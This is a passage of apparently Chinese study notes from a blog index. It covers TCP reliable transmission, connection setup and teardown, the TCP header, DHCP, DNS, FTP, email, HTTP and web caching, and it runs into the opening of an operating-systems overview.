5.6.4.png TCP超时重传时间的选择 %}\n\n{% asset_img 5.6.5.png TCP超时重传时间的选择 %}\n\n举例：\n\n{% asset_img 5.6.6.png 例子 %}\n\n## 5.7 TCP可靠传输的实现\n\nTCP基于以字节为单位的滑动窗口来实现可靠传输。\n\n例如：接收方告诉发送方它的接收窗口为20字节，确认号字段的值为31，这表明接收方希望收到下一个数据的序号为31，序号为31前的数据已被正确接收。\n\n{% asset_img 5.7.1.png TCP可靠传输 %}\n\n{% asset_img 5.7.2.png TCP可靠传输的例子 %}\n\n{% asset_img 5.7.3.png TCP可靠传输的例子 %}\n\n若接收方收到未按序到达的数据，如本例收到32、33编号字节数据，由于TCP的确认方式是只能发送按序收到的最高序号确认，因此发送一个ack = 31的确认信号，也就是表示现在需要发送方发送31号数据。\n\n\n发送方收到ack = 31报文后，知道31号数据未按序到达，但是根据上面所学的知识，只有3次接收到同一个ack信号才会进行重传，此时不做处理，继续发送往下的数据。\n\n{% asset_img 5.7.4.png TCP可靠传输的例子 %}\n\n此时若成功接收到31号数据，此时31到33号数据按序到达，此时接收方会择机将数据交给应用层，并且将窗口向后滑动3字节，同时发送确认报文。\n\n{% asset_img 5.7.5.png TCP可靠传输的例子 %}\n\n在接收方发送的确认报文被发送方收到后，会将发送窗口向后滑动若干字节（此处为3字节）。发送方此时会将31、32、33字节数据从缓存中删除。此时若发送方又发送了3个未按序到达的数据，接收方接受数据后不做处理。\n\n{% asset_img 5.7.6.png TCP可靠传输的例子 %}\n\n若发送方发送完全部的发送窗口数据，此时不能再发送数据。若迟迟等不到接收方确认信号，重传计时器超时，此时会重新发送发送窗口内已发送的数据，并重启重传计时器。\n\n{% asset_img 5.7.7.png TCP可靠传输 %}\n\n{% asset_img 5.7.8.png 习题一 %}\n\n{% asset_img 5.7.9.png 习题二 %}\n\n## 5.8 TCP的运输连接管理\n\n{% asset_img 5.8.1.png TCP的运输连接管理 %}\n\n### 5.8.1 TCP的连接建立(三次握手)\n\nTCP的连接建立要解决以下三个问题：\n\n1. 使TCP双方都能确知对方的存在\n2. 使TCP双方能够协商一些参数（如窗口最大值、是否使用窗口扩大选项和时间戳选项和服务质量等等）\n3. 使TCP双方能够对运输实体资源（如缓存大小、连接表中的项目等）进行分配\n\n使用三报文握手建立连接的具体过程：\n\n在最开始，客户端和服务器都是处于关闭状态，此时双方的TCP进程都是关闭的。服务器在连接之前要进行准备，创建传输控制块，在块中有TCP连接表等一些TCP连接的重要信息。创建后便开始监听，准备接收来自客户端的连接请求。与服务器类似，客户端进程也需要进行准备，其准备过程只有创建传输数据块。准备完毕后开始“握手”。\n\n{% asset_img 5.8.3.png TCP的运输连接管理 %}\n\n在打算建立TCP连接时，客户端向服务器进程发送TCP连接请求报文段，并进入同步已发送状态。TCP连接请求报文段首部中，有两个关键数据位：\n\n- 同步位SYN：被设置为1，表明这是一个TCP连接请求报文段\n- 序号字段seq：被设置了一个初始值x，作为TCP客户端进程所选择的初始序号\n\n注意：TCP规定SYN被设置为1的报文段不能携带数据，但要消耗掉一个序号。\n\n{% asset_img 5.8.4.png TCP的运输连接管理 %}\n\nTCP服务器进程收到客户端发送的TCP连接请求报文段后，如果同意建立连接，则向TCP客户进程发送TCP连接请求确认报文段，并进入同步已接收状态。TCP连接请求确认报文段首部中有几个关键数据位：\n\n- 同步位SYN和确认位ACK：都设置为1，表明这是一个TCP连接请求确认报文段\n- 序号字段seq：设置了一个初始值y，作为TCP服务器进程所选择的初始序号\n- 确认号字段ack：值被设置成了x+1，这是对TCP客户进程所选择的初始序号（seq）的确认\n\n注意：这个报文段也不能携带数据，因为它是SYN被设置为1的报文段，但同样要消耗掉一个序号。\n\n{% asset_img 5.8.5.png TCP的运输连接管理 %}\n\nTCP客户进程收到TCP连接请求确认报文段后，还要向TCP服务器进程发送一个普通的TCP确认报文段，并进入连接已建立状态。普通的TCP确认报文段首部中有以下重点数据位：\n\n- 确认位ACK：设置为1，由于没有SYN同步字段，表明这是一个普通的TCP确认报文段，表示已确认收到建立连接报文\n- 序号字段seq：设置为x+1，因为TCP客户进程发送的第一个TCP报文段的序号为x，所以TCP客户进程发送的第二个报文段的序号为x+1（SYN字段报文需要消耗一个序号）\n- 确认号字段ack：设置为y+1，这是对TCP服务器进程所选择的初始序号的确认\n\n注意：TCP规定普通的TCP确认报文段(只有ACK没有SYN)可以携带数据，但如果不携带数据，则不消耗序号。\n\n三次握手完毕后，服务器也进入连接已建立状态，此时双方连接已建立，可以开始进行数据传输。\n\n{% asset_img 5.8.2.png TCP的运输连接管理 %}\n\n为什么TCP客户进程最后还要发送一个普通的TCP确认报文段呢？是否多余？\n\n{% asset_img 5.8.6.png 两次握手 %}\n\n三次握手并不多余，三次握手建立连接是为了防止已经失效的连接请求报文段突然又传到服务端，产生错误。\n\n### 5.8.2 TCP的连接释放(四次挥手)\n\nTCP通过四报文挥手来释放连接：\n\n在双方连接已建立后，此时客户端主动发出关闭信号。\n\n{% asset_img 5.8.7.png TCP的连接释放 %}\n\nTCP客户进程会发送TCP连接释放报文段，并进入终止等待1状态。TCP连接释放报文段首部中有以下关键数据位：\n\n- 终止位FIN和确认位ACK：值都被设置为1，表明这是一个TCP连接释放报文段，同时也对之前收到的报文段进行确认\n- 序号字段seq：值设置为u，表示TCP客户进程之前已传送过的、数据的最后一个字节的序号加1\n- 确认号字段ack：值设置为v，表示TCP服务器进程之前已传送过的、数据的最后一个字节的序号加1\n\n注意：TCP规定终止位FIN等于1的报文段即使不携带数据，也要消耗掉一个序号。\n\n{% asset_img 5.8.8.png TCP的连接释放 %}\n\n接收方在接收到连接释放报文后，会发送一个普通的TCP确认报文段并且进入关闭等待状态。普通的TCP确认报文段首部中有以下关键数据位：\n\n- 确认位ACK：值被设置为1，表明这是一个普通的TCP确认报文段\n- 序号字段seq：值设置为v，v等于TCP服务器进程之前已传送过的、数据的最后一个字节的序号加1，与之前收到的TCP连接释放报文段中的确认号ack值匹配\n- 确认号字段ack：值为u+1，这是对TCP连接释放报文段的确认，也就是为发送方连接释放报文中的seq的值+1\n\n在进行第二次挥手后，会产生以下过程：\n\n\nTCP服务器进程通知高层应用进程，TCP客户进程要断开与自己的TCP连接，此时的TCP连接进入半关闭状态。\n\n\n所谓半关闭状态可以认为，此时客户端与服务器的连接不再传输数据，也就是客户端没有数据发送。而此时服务器若有剩余数据要发送会继续发送。客户端到服务器的数据传输信道关闭了，而服务器到客户端这一半没有关闭，因此称为半关闭状态。这个半关闭状态可能会持续一段时间，直到发送方没有数据进行发送。\n\n在以上等待过程中，客户端会进入终止等待2状态：\n\n{% asset_img 5.8.9.png TCP的连接释放 %}\n\n当服务器没有数据要传输后，进行第三次挥手：\n\n{% asset_img 5.8.10.png TCP的连接释放 %}\n\n此时TCP服务器进程会发送TCP连接释放报文段并进入最后确认状态。在该报文段中有以下关键数据段：\n\n- 终止位FIN和确认位ACK：值都被设置为1，表明这是一个TCP连接释放报文段，同时也对之前收到的报文段进行确认\n- 序号seq：值为w，因为在半关闭状态下，TCP服务器进程可能又发送一段数据，因此w就是该段数据最后的序号\n- 确认号ack：值为u+1，这是对之前收到的TCP连接释放报文段的重复确认，因此值为发送方第一次挥手发送的seq值+1\n\nTCP客户进程收到TCP连接释放报文段后开始第四次挥手：\n\n{% asset_img 5.8.11.png TCP的连接释放 %}\n\n此时针对第三次挥手的报文段发送普通的TCP确认报文段，之后进入时间等待状态。该报文段首部中有以下关键数据位：\n\n- 确认位ACK：值被设置为1，表明这是一个普通的TCP确认报文段\n- 序号字段seq：值设置为u+1，用来表示最后一个发送的字节序号，这是因为TCP客户进程之前发送的TCP连接释放报文段(带有FIN)虽然不携带数据，但要消耗掉一个序号\n- 确认号ack：值设置为w+1，这是对所收到的TCP连接释放报文段的确认\n\nTCP服务器进程收到该报文段后就进入关闭状态，而TCP客户进程还要经过2倍的MSL后才能进入关闭状态：\n\n{% asset_img 5.8.12.png TCP的连接释放 %}\n\nMSL具体的值可以根据TCP协议的不同实现进行设置。\n\n为什么不发送报文段后直接关闭，而是要等待2MSL个时间后才关闭？是否有必要？\n\n{% asset_img 5.8.13.png TCP的连接释放 %}\n\n若客户端发送完最后一次报文后，也就是第四次挥手后就直接进入关闭状态，此时若第四次挥手报文丢失，会导致服务器的超时重传。\n\n\n此时客户端又已经关闭，导致不接受该报文，因此服务器会一直不断重传，并一直处于最后确认状态无法进入关闭状态。\n\n\n因此，有以下结论：客户端进入时间等待状态以及处于该状态2MSL时长，可以确保TCP服务器进程可以收到最后一个TCP确认报文段而进入关闭状态。\n\n\nTCP客户进程在发送完最后一个TCP确认报文段后，再经过2MSL时长，就可以使本次连接持续时间内所产生的所有报文段都从网络中消失，这样就可以使下一个新的TCP连接中，不会出现旧连接中的报文段。\n\n若出现这样一种情况：\n\nTCP双方已经建立了连接，但是传输过程中TCP客户进程所在的主机出现了故障，此时TCP服务器进程以后就不能再收到TCP客户进程发来的数据，这时服务器进程会一直处于等待状态。为了使TCP服务器进程不要再白白等待下去，出现了TCP保活计时器：\n\n{% asset_img 5.8.14.png TCP保活计时器 %}\n\n## 5.9 TCP报文的首部格式\n\n- 为了实现可靠传输，TCP采用了面向字节流的方式。\n- TCP在发送数据时，从发送缓存中取出一部分或者全部字节，并给其添加一个首部使之成为TCP报文段后进行发送。\n  - 一个TCP报文段由首部和数据载荷两部分构成；\n  - TCP的全部功能都体现在它首部中各字段的作用。\n\n{% asset_img 5.9.1.png TCP报文的首部格式 %}\n\nTCP首部和IP地址的首部类似，都由固定部分和扩展部分构成。\n\n**相关字段功能解释**：\n\n- 源端口和目的端口：各占16比特。\n- 序号：占32比特，取值范围$[0,2^{32}-1]$，序号增加到最后一个后，下一个序号又从0开始。用来指出本TCP报文段数据载荷的第一个字节的序号。\n- 确认号：占32比特，取值范围$[0,2^{32}-1]$，确认号增加到最后一个后，下一个确认号又从0开始。用来指出期望收到对方下一个TCP报文段的数据载荷的第一个字节的序号，同时也是对之前收到的所有数据的确认。若确认号=n，则表明到序号n-1为止的所有数据都已被正确接收，期望接受序号为n的数据。\n- 数据偏移：占4比特，并以4字节为单位。用来指出TCP报文段的数据载荷部分的起始处距离TCP报文段的起始处有多远。这个字段实际上指出了TCP报文段的首部长度，最小为20字节，最大为60字节。\n- 保留：占6比特，保留为今后使用，但目前应置为0。\n- 紧急标志位URG：1表示紧急指针字段有效；0表示无效。\n- 确认标志位ACK：1表示确认号字段有效；0表示无效。TCP规定在连接建立后所有传送的TCP报文段都必须把ACK置1。\n- 推送标志位PSH：接收方的TCP收到该标志位为1的报文段会尽快上交应用进程，而不必等到接收缓存都填满后再向上交付。\n- 复位标志位RST：用来复位TCP连接。当RST=1时，表示TCP连接出现了异常，必须释放连接，然后再重新建立连接。RST置1还用来拒绝一个非法的报文段或拒绝打开一个TCP连接。\n- 同步标志位SYN：在TCP连接建立时用来同步序号。\n- 终止标志位FIN：用来释放TCP连接。\n- 窗口：占16比特，以字节为单位。指出发送本报文段的一方的接收窗口。窗口值作为接收方让发送方设置其发送窗口的依据。这是以接收方的接受能力来控制发送方的发送能力，称为流量控制。\n- 校验和：占16比特，检查范围包括TCP报文段的首部和数据载荷两部分。在计算校验和时，要在TCP报文段的前面加上12字节的伪首部。\n- 紧急指针：占16比特，以字节为单位，用来指明紧急数据的长度。当发送方有紧急数据时，可将紧急数据插队到发送缓存的最前面，并立刻封装到一个TCP报文段中进行发送。紧急指针会指出本报文段数据载荷部分包含了多长的紧急数据，紧急数据之后是普通数据。\n- 选项：\n  - 最大报文段长度MSS选项：TCP报文段数据载荷部分的最大长度。\n  - 窗口扩大选项：为了扩大窗口(提高吞吐率)。\n  - 时间戳选项：①用来计算往返时间(RTT)；②用于处理序号超范围的情况，又称为防止序号绕回(PAWS)。\n  - 选择确认选项\n- 填充：由于选项的长度可变，因此使用填充来确保报文段首部是4的整数倍。\n\n### 5.9.1 序号、确认号、ACK字段\n\n{% asset_img 5.9.2.png 序号、确认号、ACK字段 %}\n\n# 6. 应用层\n\n## 6.1 应用层概述\n\n应用层解决通过应用进程的交互来实现特定网络应用的问题。\n\n应用层是计算机网络体系结构的最顶层，是设计和建立计算机网络的最终目的，也是计算机网络中发展最快的部分。\n\n- 早期基于文本的应用(电子邮件、远程登录、文件传输、新闻组)\n- 20世纪90年代将因特网带入千家万户的万维网(WWW)\n- 当今流行的即时通信、P2P文件共享及各种音视频应用\n- 计算设备的小型化和“无处不在”，宽带住宅接入和无线接入的日益普及和迅速发展，为未来更多的新型应用提供了广阔的舞台\n\n{% asset_img 6.1.1.png 应用层概述 %}\n\n## 6.2 客户/服务器(C/S)方式和对等(P2P)方式\n\n- 网络应用程序运行在处于网络边缘的不同的端系统上，通过彼此间的通信来完成某项任务。\n\n- 开发一种新的网络应用给首先要考虑的问题就是网络应用程序在各种端系统上的组织方式和他们之间的关系。\n\n  目前流行的主要有以下两种：\n\n  客户/服务器(Client/Server，C/S)方式\n  对等方式(Peer-to-Peer，P2P)方式\n\n### 6.2.1 客户/服务器方式\n\n{% asset_img 6.2.1.png 客户/服务器方式 %}\n\n### 6.2.2 对等方式\n\n{% asset_img 6.2.2.png 对等方式 %}\n\n## 6.3 动态主机配置协议(DHCP)\n\n互联网广泛使用的动态主机配置协议 DHCP (Dynamic Host Configuration Protocol) ，它提供了即插即用连网 (plug-and-play networking) 的机制。这种机制允许一台计算机加入新的网络和自动获取 IP 地址，而不用手工配置。\n\n在没有DHCP时，我们需要手动给每台主机设计IP地址、子网掩码、默认网关等数据。\n\n{% asset_img 6.3.1.png 动态主机配置协议 %}\n\n当在网络中设置DHCP服务器后：\n\n{% asset_img 6.3.2.png 动态主机配置协议 %}\n\n### 6.3.1 DHCP工作过程\n\n- DHCP 使用客户/服务器方式\n\n- DHCP在运输层使用UDP协议，DHCP 服务器运行在 67 号端口， DHCP客户运行在 68 号端口\n\n1.客户端广播DHCP发送报文：\n\n{% asset_img 6.3.3.png DHCP工作过程 %}\n\n由于此时客户端还没有设置地址，所以将源地址设置为0.0.0.0，目的地址设置为广播地址255.255.255.255，目的端口设置为67（DHCP服务器端口）。除了DHCP服务器外，其他进程不能接收该UDP报文（其他接收端口不是67）。\n\n\n在DHCP发送报文中格式比较复杂，只需要知道其内部有事务ID和DHCP客户端的MAC地址。\n\n\nDHCP服务器进程是一直运行的，当收到DHCP发送报文后，会根据其MAC地址在自己的数据库查找，若数据库中有该MAC地址的配置信息，则用这些配置信息来构建发送报文。若没有，则采用默认信息来构建并发送DHCP报文。\n\n2.DHCP服务器接收报文后返回DHCP提供报文：\n\n{% asset_img 6.3.4.png DHCP工作过程 %}\n\n源地址设置为服务器地址，由于客户端还没有设置地址，所以将目的地址设置为广播地址255.255.255.255（只有广播地址能使其接收到），目的端口设置为68（DHCP客户端端口）。除了DHCP客户端外，其他进程不能接收该UDP报文（其他接收端口不是68）。\n\n3.客户端发送选择服务器的发送请求报文：\n\n{% asset_img 6.3.5.png DHCP工作过程 %}\n\n为了避免向网络中的每一个DHCP服务器单播发送DHCP请求报文，选择广播发送报文，来告知他们是不是自己选择的DHCP服务器。DPCH服务器根据报文中的内容，若发现其选择是本服务器，便将其接收，并给该客户端发送DHCP确认报文。\n\n4.DHCP服务器发送确认报文：\n\n{% asset_img 6.3.6.png DHCP工作过程 %}\n\n当到达租用期的一半时，会发送续约请求给服务器，根据服务器情况进行相应反馈。若没收到服务器反馈，会在0.875个租用期后再次发送并等待回应。若还是没有反应，会在租用期过期后立即放弃使用该IP地址。\n\n\n注意：客户端可以随时终止使用该IP地址。\n\n{% asset_img 6.3.7.png DHCP工作过程 %}\n\n### 6.3.2 DHCP中继代理\n\n有路由器进行隔离的网络能使用DHCP吗？\n\n{% asset_img 6.3.8.png DHCP中继代理 %}\n\n由于路由器隔离广播域，因此其DHCP请求报文不能发送到DHCP服务器中，所以其不能使用DHCP服务。解决方法是给路由器配置DHCP服务器的IP地址使其成为DHCP代理中继：\n\n{% asset_img 6.3.9.png DHCP中继代理 %}\n\n这样做的原因是可以减少DHCP服务器的数量。通过中继代理进行转发来获取DHCP，而不用新增加一个DHCP服务器。\n\n## 6.4 域名系统(DNS)\n\n域名系统(Domain Name System，DNS)的作用是将请求的域名转换为IP地址，给相关程序进行发送IP请求。DNS报文使用运输层的UDP协议进行封装，运输层端口号为53。\n\n{% asset_img 6.4.1.png 域名系统的作用 %}\n\n### 6.4.1 域名空间\n\n{% asset_img 6.4.2.png 层次结构的命名树 %}\n\n{% asset_img 6.4.3.png 域名系统 %}\n\n{% asset_img 6.4.4.png 顶级域名的分类 %}\n\n{% asset_img 6.4.5.png 域名空间 %}\n\n### 6.4.2 域名服务器\n\n{% asset_img 6.4.6.png 域名服务器 %}\n\n### 6.4.3 域名解析过程\n\n{% asset_img 6.4.7.png 域名解析过程 %}\n\n### 6.4.4 高速缓存\n\n{% asset_img 6.4.8.png 高速缓存 %}\n\n{% asset_img 6.4.9.png 高速缓存 %}\n\n## 6.5 文件传送协议(FTP)\n\n- 文件传送是将某台计算机中的文件通过网络传送到可能相距很远的一台计算机中，是一项基本的网络应用。\n\n- 文件传输协议(File Transfer Protocol，FTP)是因特网上使用的最广泛的文件传送协议。\n\n  - FTP提供交互式的访问，允许客户指明文件的类型和格式（如指明是否使用ASCII码），并允许文件具有存取权限（如访问文件必须经过授权，并输入有效的口令）。\n\n  - FTP屏蔽了各计算机系统的细节，因而适合于在异构网络中任意计算机之间传输文件。\n\n- 在因特网发展早期阶段，用FTP传输占整个因特网通信量的三分之一，而电子邮件和域名系统所产生的通信量还要小于FTP所产生的通信量。到了1995年，万维网(WWW)的通信量才首次超过了FTP。\n\n### 6.5.1 FTP的应用\n\nFTP使用C/S方式（用户/服务器方式），端口号为21/20。\n\nFTP客户计算机可将各种类型的文件上传到FTP服务器计算机：\n\n{% asset_img 6.5.1.png FTP的应用 %}\n\nFTP客户计算机可以从FTP服务器计算机下载文件：\n\n{% asset_img 6.5.2.png FTP的应用 %}\n\nFTP服务器可以有专用的高速服务器组成，也可以是普通的个人计算机。在Windows中就可以使用自带的FTP服务创建FTP 服务器，或者使用第三方FTP软件创建客户端。\n\nFTP的常见用途是在计算机之间传输文件，尤其是用于批量传输文件。FTP的另一个常见用途是让网站设计者将构成网站内容的大量文件批量上传到他们的Web服务器。\n\n### 6.5.2 FTP的基本工作原理\n\n{% asset_img 6.5.3.png FTP的基本工作原理 %}\n\n默认情况下，FTP使用TCP 21端口进行控制连接，TCP 20端口进行数据连接。\n\n控制连接在整个会话期间一直保持打开，用于传送FTP相关的控制命令。\n\n传输连接用于文件传输，每次文件传输时才建立，传输结束后就关闭。\n\n## 6.6 电子邮件\n\n- 电子邮件（E-mail）是因特网上最早流行的一种应用，并且仍是当今因特网上最重要、最实用的应用之一。\n- 传统的电话通信属于实时通信，具有以下两个缺点：\n  - 电话通信的主叫和被叫方必须同时在场\n  - 一些不是十分紧迫的电话也常常不必要地打断人们的工作或休息\n- 电子邮件和邮件系统的寄信相似，其工作过程如下：\n  1. 发件人将邮件发送到自己使用的邮件服务器\n  2. 发件人的邮件服务器将收到的邮件按其目的地址转发到收件人邮件服务器中的收件人邮箱\n  3. 收件人在方便的时候访问收件人邮件服务器中自己的邮箱，获取收到的电子邮件\n- 电子邮件使用方便、传递迅速而且费用低廉。它不仅可以传送文字信息，而且还可附上声音和图像。\n- 由于电子邮件的广泛应用，现在许多国家已经正式取消了电报业务。在我国，电信局的电报业务也因电子邮件的普及而濒临消失。\n\n{% asset_img 6.6.1.png 电子邮件 %}\n\n{% asset_img 6.6.2.png 电子邮件 %}\n\n### 6.6.1 SMTP基本工作原理\n\n简单邮件传送协议(Simple Mail Transfer Protocol， SMTP)\n\nSMTP发送方的邮件服务器会周期性对邮件进行缓存扫描，若发现有邮件，会通过TCP协议，端口号25与接收方的邮件服务器建立连接。\n\n\n建立这条连接后，STMP客户基于这条连接给SMTP服务器发送SMTP命令，共14条。SMTP服务器会给SMTP客户端发送相应的应答，共21种。\n\n\n双方通过这种命令和应答的方式最终实现客户端发送邮件给SMTP服务器。\n\n{% asset_img 6.6.3.png SMTP基本工作原理 %}\n\n### 6.6.2 电子邮件格式\n\n电子邮件的信息格式并不是由SMTP定义的，而是在RFC 822中单独定义的。这个RFC文档已在2008年更新为RFC 5322。一个电子邮件有信封和内容两部分。而内容又由首部和主体两部分构成。\n\n{% asset_img 6.6.4.png 电子邮件格式 %}\n\n### 6.6.3 多用途因特网邮件扩展MIME\n\n{% asset_img 6.6.5.png MIME %}\n\n多用途因特网邮件扩展(Multipurpose Internet Mail Extension，MIME)增加了5个新的邮件首部字段，这些字段提供了有关邮件主体的信息。定义了许多邮件内容的格式，对多媒体电子邮件的表示方法进行了标准化。定义了传统编码，可对任何内容格式进行转换，而不会被邮件系统改变。\n\n实际上，MIME不仅仅用于SMTP，也用于同样面向ASCII字符的HTTP。\n\n### 6.6.4 邮件读取协议\n\n{% asset_img 6.6.6.png 邮件读取协议 %}\n\n### 6.6.5 基于万维网的电子邮件\n\n{% asset_img 6.6.7.png 基于万维网的电子邮件 %}\n\n## 6.7 万维网(WWW)\n\n- 万维网WWW(World Wide Web)并非某种特殊的计算机网络。它是一个规模很大、联机式的信息储藏所，是运行在因特网上的一个分布式应用。\n- 万维网利用网页之间的超链接将不同网站的网页链接成一张逻辑上的信息网。万维网用链接的方法能非常方便地从互联网上的一个站点访问另一个站点，从而主动地按需获取丰富的信息。\n\n{% asset_img 6.7.1.png 浏览器 %}\n\n客户端向目的IP地址发送请求，服务器收到后会通过因特网发送响应报文，解析成万维网文档，显示在客户端上。\n\n为了方便地访问在世界范围的文档，万维网使用统一资源定位符URL来指明因特网上任何种类“资源”的位置。\n\nURL的一般格式由以下四个部分组成：\n$$\n<协议>://<主机>:<端口>/<路径>\n$$\n\n### 6.7.1 万维网文档\n\n我们对浏览器的页面进行另存为到本地，其文件就是万维网的文档。\n\n{% asset_img 6.7.2.png 万维网文档 %}\n\n### 6.7.2 超文本传输协议(HTTP)\n\nHTTP定义了浏览器（万维网进行）怎样向万维网服务器请求万维网文档，以及万维网服务器怎么样把万维网文档传送给浏览器。\n\n{% asset_img 6.7.3.png HTTP协议 %}\n\n首先客户进程会利用80端口和服务器建立TCP请求，然后通过该连接发送HTTP请求报文。服务器收到请求报文后也会通过该连接发送HTTP响应报文。\n\n{% asset_img 6.7.4.png HTTP响应报文 %}\n\n{% asset_img 6.7.5.png HTTP响应报文 %}\n\n### 6.7.3 HTTP报文格式\n\n{% asset_img 6.7.6.png HTTP请求报文格式 %}\n\n{% asset_img 6.7.7.png HTTP请求报文格式 %}\n\n{% asset_img 6.7.8.png HTTP响应报文格式 %}\n\n响应报文中常见的状态行：\n\n```\nHTTP/1.1 202 Accepted\t\t接受请求\nHTTP/1.1 400 Bad Request\t错误的请求\nHTTP/1.1 404 Not Found\t\t找不到页面\n```\n\n### 6.7.4 Cookie\n\n{% asset_img 6.7.9.png Cookie %}\n\n{% asset_img 6.7.10.png Cookie %}\n\n### 6.7.5 万维网缓存与代理服务器\n\n- 在万维网中还可以使用缓存机制以提高万维网的效率。\n- 万维网缓存又称为Web缓存(Web Cache)，可位于客户机，也可位于中间系统上。位于中间系统上的Web缓存又称为代理服务器(Proxy Server)。\n- Web缓存把最近的一些请求和响应暂存在本地磁盘中。当新请求到达时，若发现这个请求与暂时存放的请求相同，就返回暂存的响应，而不需要按URL的地址再次去因特网访问该资源。\n\n当校园网中的某台主机要访问因特网上的原始服务器时，会先请求代理服务器，若代理服务器存放有所请求的对象，则代理服务器会向该主机发回所包含的请求对象的响应。\n\n{% asset_img 6.7.11.png 缓存与代理服务器 %}\n\n当校园网中的某台主机要访问因特网上的原始服务器时，请求代理服务器，若代理服务器没有所请求的对象，则代理服务器会向原始服务器发送请求。服务器响应后，代理服务器会将其放入自己的Web缓存，再将其发给用户主机。\n\n{% asset_img 6.7.12.png 缓存与代理服务器 %}\n\n{% asset_img 6.7.13.png 缓存与代理服务器 %}\n\n有这样一种情况：若代理服务器存放该请求的缓存后，原始服务器该请求响应有所修改，此时若用户再次请求，在代理服务器的缓存中就是旧的响应报文了。所以原始服务器通常会为每个响应的对象设定一个修改时间字段和一个有效日期字段。\n\n若修改时间字段未过期，则会之间将缓存中报文封装在响应报文中发回给主机。\n\n{% asset_img 6.7.14.png 缓存与代理服务器 %}\n\n若修改时间已过期，此时会向原始服务器发送一个if-modified-since信号，意思是询问是否发生响应文档改变。若没有改变，则原始服务器回送一个Not Modified信号，代理服务器接收到后会将修改时间改为当前时间，不修改缓存中的文档，并且将缓存中的文档包装在响应报文中发送给用户主机。\n\n{% asset_img 6.7.15.png 缓存与代理服务器 %}\n\n若修改时间已过期，此时会向原始服务器发送一个if-modified-since信号，意思是询问是否发生响应文档改变。若改变，则原始服务器会在响应报文中附带修改后的文档，代理服务器接收到后会将修改时间改为当前时间，并且缓存中的文档进行更新，更新后，将缓存中新的文档包装在响应报文中发送给用户主机。\n\n{% asset_img 6.7.16.png 缓存与代理服务器 %}\n\n","categories":["基础知识"]},{"title":"操作系统","url":"/posts/d04bd5bc.html","content":"\n这个笔记是基于 [王道考研 操作系统](https://www.bilibili.com/video/BV1YE411D7nH?p=1) 写的，我觉得前面会讲得有点枯燥，但后面结合图和例题讲算法时非常不错，可以一看。\n\n<!--more-->\n\n# 1. 操作系统概述\n\n操作系统（英语：Operating System，缩写：OS）是管理计算机硬件与软件资源的系统软件，同时也是计算机系统的内核与基石。操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入与输出设备、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。\n\n## 1.1 操作系统的功能\n\n1. 作为系统资源的管理者：文件管理、设备管理、内存管理、处理机制(进程管理)\n\n   目标：安全、高效\n\n2. 作为用户和计算机硬件之间的接口：命令接口、程序接口(系统调用)、图形用户界面(GUI)\n\n   目标：方便用户使用\n\n3. 作为最接近硬件层次：实现对硬件及其的扩展\n\n## 1.2 操作系统的特征\n\n### 1.2.1 并发\n\n并发：指两个或多个事件在同一时间间隔内发生。这些事件宏观上是同时发生的，但微观上是交替发生的。\n\n并行：指两个或多个事件在同一时刻同时发生。\n\n操作系统的并发性指计算机系统中同时存在着多个运行着的程序。操作系统通过引入进程与线程，使得程序能够并发运行。\n\n### 1.2.2 共享\n\n共享：指系统中的资源可供内存中多个并发执行的进程共同使用。\n\n有两种共享方式：互斥共享和同时共享。\n\n互斥共享：系统中的某些资源，虽然可以提供给多个进程使用，但一个时间段内只允许一个进程访问该资源。\n\n同时共享：系统中的某些资源，允许一个时间段内由多个进程并发对它们进行访问。\n\n### 1.2.3 虚拟\n\n虚拟：把物理上的实体转换为多个逻辑上的对应物。物理实体是实际存在的，而逻辑上的对应物是用户感受到的。\n\n主要有两种虚拟技术：时分复用技术和空分复用技术。\n\n多个进程在同一个处理器并发执行使用了时分复用技术，让每个进程轮流占有处理器，每次只执行一个小时间片，并且这个时间片在进程之间互相切换。\n\n虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间和物理内存使用页面进行交换。地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行页面置换算法，将该页置换到内存中。\n\n### 1.2.4 异步\n\n异步：在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底的，而是走走停停，以不可预知的速度向前推进。\n\n> 如果失去了并发性，则系统只能串行地处理各个进程，每个进程的执行会一贯到底。如果失去了并发性，则一个时间段内系统中只需运行一道程序，那么就失去了实现虚拟性的意义。同样共享也是建立在并发的基础上的，如果没有并发，共享是无法实现的。所以并发是共享、虚拟、异步的前提。\n\n## 1.3 操作系统的发展和分类\n\n### 1.3.1 手工操作阶段\n\n主要缺点：用户独占全机、人机速度矛盾导致资源利用率极低\n\n### 1.3.2 批处理系统\n\n#### 1.3.2.1 单道批处理系统\n\n引入**脱机输入/输出技术**(用磁带完成)，并**监督程序**(操作系统的雏形)负责控制作业的输入、输出。\n\n主要优点：缓解了一定程度的人机速度矛盾，资源利用率有所提升。\n\n主要缺点：**内存中仅能有一道程序运行**，只有该程序运行结束之后才能调入下一道程序。**CPU有大量时间是在空闲等待I/O完成**。资源利用率依然很低。\n\n#### 1.3.3.2 多道批处理系统\n\n主要优点：多道程序**并发**执行，**共享**计算机资源。**资源利用率大幅提升**，CPU和其它资源保持“忙碌”状态，系统吞吐量增大。\n\n主要缺点：用户响应时间长，**没有人机交互功能**(用户提交自己的作业之后就只能等待计算机处理完成，中间不能控制自己的作业运行)\n\n### 1.3.3 分时操作系统\n\n分时操作系统：计算机以**时间片**为单位**轮流为各个用户/作业服务**，各个用户可通过终端与计算机进行交互。\n\n主要优点：用户请求可以被及时响应，**解决了人机交互的问题**。允许多个用户同时使用一台计算机，并且用户对计算机的操作相互独立，感受不到别人的存在。\n\n主要缺点：**不能优先处理一些紧急任务**。操作系统对各个用户/作业都是完全公平的，循环地为每个用户/作业服务一个时间片，不区分任务的紧急性。\n\n### 1.3.4 实时操作系统\n\n主要优点：**能够优先响应一些紧急任务**，某些紧急任务不需时间片排队。\n\n在实时操作系统的控制下，计算机系统接收到外部信号后及时进行处理，并且**要在严格的时限内处理完事件**。实时操作系统的主要特点是**及时性和可靠性**。\n$$\n实时操作系统\n\\begin{cases}\n硬实时系统：必须在绝对严格的规定时间内完成处理\\\\\n软实时系统：能接受偶尔违反时间规定\n\\end{cases}\n$$\n\n## 1.4 